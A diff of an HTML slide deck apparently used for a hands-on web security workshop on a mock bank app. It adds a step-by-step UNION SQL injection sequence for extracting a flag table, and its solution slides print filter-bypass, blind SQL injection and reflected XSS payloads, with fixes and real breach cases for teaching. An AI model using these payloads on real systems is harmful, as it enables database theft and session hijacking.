@@ -589,13 +589,13 @@ $sql = "&hellip; WHERE customer_id = '" . <span class="inj">$cid</span> . "' AND
             password branch is false → whole clause = customer_id='BS100234'</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">BS100234') OR ('1'='1</div><div class="sol-paynote">close the bracket, OR outside it</div><div class="sol-lesson">&#128161; Comment-blacklisting is <b>not</b> a SQLi defence — you break the bracket without one.</div></div></section>
 <section id="s27" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
-<h2 class="mt2 mb1">Fortinet, 2024 &mdash; SQL injection inside a security product</h2>
+<h2 class="mt2 mb1">MOVEit, 2023 &mdash; one SQL injection, thousands of victims</h2>
 <div class="rw mt2">
-<p class="desc" style="font-size:.97rem">A SQL injection flaw in FortiClient EMS &mdash; software enterprises buy <em>to manage endpoint security</em> &mdash; let an unauthenticated attacker run commands on the server. A patch existed. Exploitation in the wild began within days of public disclosure, and the flaw went onto the US authorities&rsquo; &ldquo;known exploited&rdquo; list. The same 25-year-old bug class you just used, shipping in 2024.</p>
-<div class="stats"><div class="stat"><div class="stat-n">CVE-2023-48788</div><div class="stat-l">the identifier</div></div><div class="stat"><div class="stat-n">9.8 / 10</div><div class="stat-l">severity score</div></div><div class="stat"><div class="stat-n">Days</div><div class="stat-l">from disclosure to mass exploitation</div></div><div class="stat"><div class="stat-n">BFSI</div><div class="stat-l">heavily represented among users</div></div></div>
+<p class="desc" style="font-size:.97rem">MOVEit Transfer is a trusted file-transfer product used by banks, governments, airlines and health systems. A single SQL injection flaw in it was exploited at scale by an extortion group. The organisations breached had done nothing wrong in their own code &mdash; they had simply bought and trusted the same product.</p>
+<div class="stats"><div class="stat"><div class="stat-n">2,770+</div><div class="stat-l">organisations breached</div></div><div class="stat"><div class="stat-n">95M+</div><div class="stat-l">individuals affected</div></div><div class="stat"><div class="stat-n">1</div><div class="stat-l">flaw, in 1 product</div></div><div class="stat"><div class="stat-n">&gt;$12B</div><div class="stat-l">estimated cumulative cost</div></div></div>
 </div>
-<div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">And when it reaches customers &mdash; TalkTalk, UK</h3><p class="desc mt1" style="font-size:.88rem">An inherited legacy page with the identical flaw cost TalkTalk <strong>157,000 customers&rsquo; data</strong>, a then-record <strong>&pound;400,000</strong> regulatory fine, around <strong>&pound;77 million</strong> in total costs and <strong>101,000 lost customers</strong>. The chief executive explained it on national television.</p></div>
-<div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> our scanners check the code we write &mdash; who checks the security products we buy, and how fast can we patch an internet-facing appliance?</p></div>
+<div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">Closer to home &mdash; India, October 2023</h3><p class="desc mt1" style="font-size:.88rem">A listing appeared offering the personal data of roughly <strong>815 million Indians</strong> &mdash; including identity and passport details &mdash; reportedly drawn from a national health research database. Investigated by CERT-In, it is among the largest exposures of personal data ever reported anywhere.</p></div>
+<div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> which externally exposed third-party products hold our sensitive data &mdash; and how fast could we answer that question when tomorrow&rsquo;s advisory lands?</p></div>
 </div></section>
 <section id="s28" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
@@ -1183,7 +1183,7 @@ shell_exec("wkhtmltopdf page.html " . <span class="inj">$filename</span>);</pre>
 </div></section>
 <section id="s71" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 4</span><span style="color:var(--t3);font-size:.8rem">L12 &bull; CWE-347 &bull; OWASP A02:2021</span></div>
-<h1>JWT alg:none &mdash; Forge Your Own Identity Card</h1>
+<h1>JWT Flaw &mdash; Forge Your Own Identity Card</h1>
 <p class="big mt2">&ldquo;We&rsquo;re going to promote ourselves to administrator by editing a cookie.&rdquo;</p>
 </div></section>
 <section id="s72" data-phase="Live Labs" class="slide"><div class="slide-inner">
@@ -1251,7 +1251,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <div>
 <p class="sub mb1">The finding you reported</p>
 <p class="desc">You turned your ordinary customer session into an administrator&rsquo;s.</p>
-<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">The developers heard &ldquo;reject none&rdquo;.</strong> A token whose algorithm says <code>none</code> is now refused &mdash; the unsigned forgery is closed. But they matched the <em>word</em>, not the intent: the check looks for one exact spelling, and a token carries whatever algorithm string you write. <strong>If <code>none</code> is blocked, what isn&rsquo;t?</strong> You have about <strong>5 minutes</strong>.</p></div>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">The developers now verify the signature.</strong> Earlier the signature segment was never really checked; the server now validates it before trusting the token, and they&rsquo;re confident the forgery is closed. But the fix still has a gap. <strong>What did they miss?</strong> You have about <strong>5 minutes</strong>.</p></div>
 </div>
 <div>
 <p class="sub mb1">When it works</p>
@@ -1332,12 +1332,25 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 </div>
 </div></section>
-<section id="s84" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s84" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="sol-head"><span class="sol-tag">G2</span><div><div class="sol-cwe">CWE-89 &middot; Level 0 &mdash; the full query sequence</div><h2 style="margin:.04em 0">From Search Box to Flag &mdash; Copy Each Step</h2><div class="sol-where">&#128205; Statements &rarr; Search (remarks) box</div></div></div>
+<p class="desc" style="font-size:.8rem;margin:.45rem 0 .35rem">Paste each line into the search box in order (click a box to select it). 7-column query &mdash; your result lands in the <strong>Remarks</strong> cell; <code>#</code> comments out the rest.</p>
+<div style="display:flex;flex-direction:column;gap:.28rem">
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">1 &middot; Confirm the injection &mdash; a lone quote breaks the query (raw error)</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">'</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">2 &middot; Count the columns &mdash; 7 works, 8 errors</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">%' ORDER BY 7#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">3 &middot; Find the readable column &mdash; the grid prints 2 in Remarks</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,2,3,4,5,6,7#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">4 &middot; Name the database</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,database(),3,4,5,6,7#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">5 &middot; List the tables &mdash; find ctf_flags</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">6 &middot; List its columns &mdash; find username, flag</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='ctf_flags'#</div></div>
+<div><div class="sub" style="color:var(--t2);font-size:.66rem;margin-bottom:.08rem">7 &middot; Extract the flag &mdash; read your own row</div><div class="sol-pay" style="font-size:.78rem;padding:.3rem .6rem;font-weight:600">zzz' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#</div></div>
+</div>
+</div></section>
+<section id="s85" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">Every customer. Every name. Every password hash.<br/>Rendered in the bank&rsquo;s own table, with the bank&rsquo;s own styling.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">This is the shape of almost every mass data breach you have read about.<br/>Not a dramatic break-in. A search box that answered the wrong question.</p>
 </div></section>
-<section id="s85" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s86" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; SQL injection &mdash; data extraction</span></div>
 <h2 class="mb2">A filtered query is still a built query.</h2>
 <p class="desc mb2">A crafted search term was spliced into the database query &mdash; so it stopped being text to match and started reading tables it was never meant to touch.</p>
@@ -1370,7 +1383,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="desc" style="font-size:.9rem;margin:0"><span class="sub" style="color:var(--t2)">Mindset shift</span>&nbsp;&nbsp;&ldquo;We filter dangerous keywords&rdquo; &rarr; &ldquo;We never let input be parsed as SQL.&rdquo;</p>
 </div>
 </div></section>
-<section id="s86" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<section id="s87" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G2 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
 <h2 class="mb2">Read a Table You Were Never Shown</h2>
 <div class="yt">
@@ -1378,7 +1391,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <div>
 <p class="sub mb1">The finding you reported</p>
 <p class="desc">You read data out of a table the application never meant to show you.</p>
-<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">The developers added a filter</strong> that strips the dangerous SQL keywords out of your search. Run it once and the query looks clean. But it passes over your text a <strong>single time</strong> &mdash; and a keyword can be hidden <em>inside</em> another keyword, so removing it once can leave a valid one behind. <strong>Can you still reach the hidden table?</strong> You have about <strong>5 minutes</strong>.</p></div>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">The developers added a filter</strong> that strips the dangerous SQL keywords out of your search before it runs, and they&rsquo;re confident the query is now safe. But does removing the keywords actually close it? Work out how the filter behaves, and whether you can still reach the hidden table. You have about <strong>5 minutes</strong>.</p></div>
 </div>
 <div>
 <p class="sub mb1">When it works</p>
@@ -1391,7 +1404,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 
 </div>
 </div></section>
-<section id="s87" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s88" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; Defence in Depth</h3>
 <div class="grid2 gap2">
 <div>
@@ -1411,33 +1424,33 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 </div>
 </div></section>
-<section id="s88" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s89" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security</h3><p class="desc mt1" style="font-size:.9rem"><strong>The same rule as G1, applied everywhere.</strong> One parameterised login does not help if the search, the report and the export still concatenate. Coverage is the control, not the pattern.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Cyber Operations / SOC</h3><p class="desc mt1" style="font-size:.9rem"><strong>This is where detection earns its budget.</strong> One session reading 48,000 rows is an anomaly that should page a human. When prevention fails, this is the difference between an incident and a breach notification.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Infrastructure &amp; Data</h3><p class="desc mt1" style="font-size:.9rem"><strong>Least privilege on the database.</strong> If the web application&rsquo;s database account cannot read the credentials table, a successful injection returns nothing worth stealing.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Would we notice a single account reading our entire customer table &mdash; and in what timeframe?&rdquo;</p>
 </div></section>
-<section id="s89" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><div><div class="sol-cwe">CWE-89 · A03:2021</div><h2 style="margin:.06em 0">SQL Injection — Data Extraction</h2><div class="sol-where">&#128205; /statements — Remarks search box</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Read <b>another user's flag</b> out of the <code>ctf_flags</code> table.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">Only the search term is injectable — the date range is always bound. The term is spliced into a <code>LIKE</code> clause, so a crafted term stops being “text to match” and becomes SQL. Each level filters the term differently but still concatenates it.</p><div class="sol-note"><strong>Note.</strong> The flag is a per-user HMAC in <code>ctf_flags</code> (can't be shared) — extract <b>your own</b> row, read it from the results, submit it.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw → UNION / error-based</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">leaky single-pass filter → nest keywords</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">UNION looped-out + blind → one char at a time</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">bound parameter</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> the term is a <b>bound parameter</b> — <code>remarks LIKE :q</code>. It's matched as text, never parsed as SQL, at every level of cleverness.</p></div></div></div></div></section>
-<section id="s90" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Leaky single-pass blacklist</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Strips <code>union select -- # /* */</code> — but only <b>once</b>, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Hide the keyword inside itself so one removal rebuilds it.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags#</span>%'
+<section id="s90" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><div><div class="sol-cwe">CWE-89 · A03:2021</div><h2 style="margin:.06em 0">SQL Injection — Data Extraction</h2><div class="sol-where">&#128205; /statements — Remarks search box</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Read <b>another user's flag</b> out of the <code>ctf_flags</code> table.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">Only the search term is injectable — the date range is always bound. The term is spliced into a <code>LIKE</code> clause, so a crafted term stops being “text to match” and becomes SQL. Each level filters the term differently but still concatenates it.</p><div class="sol-note"><strong>Note.</strong> The flag is a per-user HMAC in <code>ctf_flags</code> (can't be shared) — extract <b>your own</b> row, read it from the results, submit it.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw → UNION / error-based</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">leaky single-pass filter → nest keywords</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">UNION looped-out + blind → one char at a time</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">bound parameter</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> the term is a <b>bound parameter</b> — <code>remarks LIKE :q</code>. It's matched as text, never parsed as SQL, at every level of cleverness.</p></div></div></div></div></section>
+<section id="s91" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Leaky single-pass blacklist</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Strips <code>union select -- # /* */</code> — but only <b>once</b>, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Hide the keyword inside itself so one removal rebuilds it.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags#</span>%'
 <span class="cmt">after one strip pass → ... UNION SELECT ... FROM ctf_flags#</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">UNIunionON  →  UNION     uni/**/on  →  union</div><div class="sol-paynote">then the same UNION / error-based dump</div></div></section>
-<section id="s91" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; UNION looped-out + blind</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>union</code> is stripped <b>repeatedly</b> until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' AND SUBSTRING((SELECT flag FROM ctf_flags
+<section id="s92" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G2</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; UNION looped-out + blind</h2><span class="sol-where" style="margin-left:auto">SQL Injection — Data Extraction</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>union</code> is stripped <b>repeatedly</b> until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.</p></div></div><pre class="sol-code">remarks LIKE '%<span class="inj">%' AND SUBSTRING((SELECT flag FROM ctf_flags
    WHERE username='&lt;you&gt;'),1,1)='B'#</span>%'
 <span class="cmt">rows returned → 1st char is 'B'  ·  no rows → wrong guess  → reconstruct char by char</span></pre><p class="sub mb1 mt3">Payload</p><div class="sol-pay">%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='&lt;you&gt;'),1,1)='B'#</div><div class="sol-paynote">row present = guess correct</div></div></section>
-<section id="s92" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s93" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
-<h2 class="mt2 mb1">MOVEit, 2023 &mdash; one SQL injection, thousands of victims</h2>
+<h2 class="mt2 mb1">Fortinet, 2024 &mdash; SQL injection inside a security product</h2>
 <div class="rw mt2">
-<p class="desc" style="font-size:.97rem">MOVEit Transfer is a trusted file-transfer product used by banks, governments, airlines and health systems. A single SQL injection flaw in it was exploited at scale by an extortion group. The organisations breached had done nothing wrong in their own code &mdash; they had simply bought and trusted the same product.</p>
-<div class="stats"><div class="stat"><div class="stat-n">2,770+</div><div class="stat-l">organisations breached</div></div><div class="stat"><div class="stat-n">95M+</div><div class="stat-l">individuals affected</div></div><div class="stat"><div class="stat-n">1</div><div class="stat-l">flaw, in 1 product</div></div><div class="stat"><div class="stat-n">&gt;$12B</div><div class="stat-l">estimated cumulative cost</div></div></div>
+<p class="desc" style="font-size:.97rem">A SQL injection flaw in FortiClient EMS &mdash; software enterprises buy <em>to manage endpoint security</em> &mdash; let an unauthenticated attacker run commands on the server. A patch existed. Exploitation in the wild began within days of public disclosure, and the flaw went onto the US authorities&rsquo; &ldquo;known exploited&rdquo; list. The same 25-year-old bug class you just used, shipping in 2024.</p>
+<div class="stats"><div class="stat"><div class="stat-n">CVE-2023-48788</div><div class="stat-l">the identifier</div></div><div class="stat"><div class="stat-n">9.8 / 10</div><div class="stat-l">severity score</div></div><div class="stat"><div class="stat-n">Days</div><div class="stat-l">from disclosure to mass exploitation</div></div><div class="stat"><div class="stat-n">BFSI</div><div class="stat-l">heavily represented among users</div></div></div>
 </div>
-<div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">Closer to home &mdash; India, October 2023</h3><p class="desc mt1" style="font-size:.88rem">A listing appeared offering the personal data of roughly <strong>815 million Indians</strong> &mdash; including identity and passport details &mdash; reportedly drawn from a national health research database. Investigated by CERT-In, it is among the largest exposures of personal data ever reported anywhere.</p></div>
-<div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> which externally exposed third-party products hold our sensitive data &mdash; and how fast could we answer that question when tomorrow&rsquo;s advisory lands?</p></div>
+<div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">And when it reaches customers &mdash; TalkTalk, UK</h3><p class="desc mt1" style="font-size:.88rem">An inherited legacy page with the identical flaw cost TalkTalk <strong>157,000 customers&rsquo; data</strong>, a then-record <strong>&pound;400,000</strong> regulatory fine, around <strong>&pound;77 million</strong> in total costs and <strong>101,000 lost customers</strong>. The chief executive explained it on national television.</p></div>
+<div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> our scanners check the code we write &mdash; who checks the security products we buy, and how fast can we patch an internet-facing appliance?</p></div>
 </div></section>
-<section id="s93" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s94" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-red">&#128308; Demo 7</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; CWE-79 &bull; OWASP A03:2021</span></div>
 <h1>Reflected XSS &mdash; Turn the Bank&rsquo;s Page Against Its Own Customer</h1>
 <p class="big mt2">&ldquo;Every attack so far targeted the bank. This one targets <em>you</em>.&rdquo;</p>
 </div></section>
-<section id="s94" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s95" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="sol-head"><span class="sol-tag">G4</span><div><div class="sol-cwe">CWE-79 &middot; A03:2021 &middot; Level 0 &mdash; live demo</div><h2 style="margin:.06em 0">Reflected XSS &mdash; Run Code on the Bank&rsquo;s Page</h2><div class="sol-where">&#128205; statement search results</div></div></div>
 <div class="grid2 mt2">
 <div>
@@ -1454,12 +1467,12 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 </div>
 </div></section>
-<section id="s95" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s96" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">&ldquo;Check your phishing awareness training&rdquo; does not help here.<br/>The link <em>was</em> the bank.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">Your customers are told to check the domain and the padlock.<br/>In this attack, both are perfect.</p>
 </div></section>
-<section id="s96" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s97" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; Reflected XSS</span></div>
 <h2 class="mb2">Reflected input is code unless you encode it.</h2>
 <p class="desc mb2">A search term was written back into the page without encoding &mdash; so a crafted value became live code running in a visitor&rsquo;s browser, on the bank&rsquo;s own domain.</p>
@@ -1492,7 +1505,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="desc" style="font-size:.9rem;margin:0"><span class="sub" style="color:var(--t2)">Mindset shift</span>&nbsp;&nbsp;&ldquo;We stripped the script tag&rdquo; &rarr; &ldquo;Is everything we echo encoded for where it lands?&rdquo;</p>
 </div>
 </div></section>
-<section id="s97" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<section id="s98" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
 <div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
 <h2 class="mb2">Make the Bank&rsquo;s Own Page Run Your Code</h2>
 <div class="yt">
@@ -1513,7 +1526,7 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 <p class="desc mt2" style="font-size:.85rem;color:var(--t3)">Note: G4 is configured as training-only in the lab, so it will not award points until you enable scoring for it in the instructor panel.</p>
 </div>
 </div></section>
-<section id="s98" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s99" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; Three Independent Layers</h3>
 <div class="grid3 mt2">
 <div class="card green-left"><h3 style="font-size:1rem;color:var(--green)">1. Encode on output</h3><pre class="mt1" style="padding:.7rem .9rem"><code><span class="kw">echo</span> <span class="fn">htmlspecialchars</span>(
@@ -1528,15 +1541,15 @@ if (<span class="inj">$claims->role === 'admin'</span>) { &hellip; }</pre>
 </div>
 <div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">The leadership point:</strong> no single control stops this. Encoding is the fix; CSP and HttpOnly are what save you on the day the encoding is missed on one page out of four hundred. <strong>That is what &ldquo;defence in depth&rdquo; actually buys.</strong></p></div>
 </div></section>
-<section id="s99" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s100" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security</h3><p class="desc mt1" style="font-size:.9rem"><strong>Encode on output, everywhere.</strong> One missed echo on one page out of four hundred is enough, which is why this needs to be a framework default rather than developer discipline.</p><p class="desc mt1" style="font-size:.9rem"><strong>Content Security Policy and HttpOnly cookies</strong> are what save you on the day the encoding is missed.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Third-Party &amp; Supply Chain</h3><p class="desc mt1" style="font-size:.9rem"><strong>Every third-party script is code you ship but do not control.</strong> Someone must own the inventory, pin the versions, and know what happens when a vendor changes hands.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Who owns the list of JavaScript running on our customer-facing pages &mdash; and when was it last reviewed?&rdquo;</p>
 </div></section>
-<section id="s100" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><div><div class="sol-cwe">CWE-79 · A03:2021  ·  🎓 training only (no flag)</div><h2 style="margin:.06em 0">Reflected XSS</h2><div class="sol-where">&#128205; /statements — search term reflection</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Run attacker JavaScript in the victim's browser via a reflected value.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The search term is reflected back into the page <b>without encoding</b>, so markup you send becomes part of the page and executes. Which encoding is missing depends on <b>where</b> it's reflected — text vs. an HTML attribute.</p><div class="sol-note"><strong>Note.</strong> Not part of the CTF (<code>ctf_eligible=false</code>) — no flag. At L0 the session cookie has <b>no HttpOnly</b>, so <code>document.cookie</code> includes it — use that to demo cookie theft.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">reflected raw into text</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">naive &lt;script&gt; strip — use handlers/nesting</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">text encoded, attribute raw — break out</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">both contexts encoded</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> <code>htmlspecialchars()</code> on <b>both</b> the text and the attribute reflections; the payload can't break out of either context, so nothing executes.</p></div></div></div></div></section>
-<section id="s101" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Naive &lt;script&gt; strip</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">A single-pass strip removes literal <code>&lt;script&gt;</code>/<code>&lt;/script&gt;</code>, so a plain script tag never fires.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Don't use a script tag — use an event handler, or nest the tag so one strip rebuilds it.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">&lt;img src=x onerror=alert(1)&gt;   ·   &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</div><div class="sol-paynote">event handler needs no &lt;script&gt;</div></div></section>
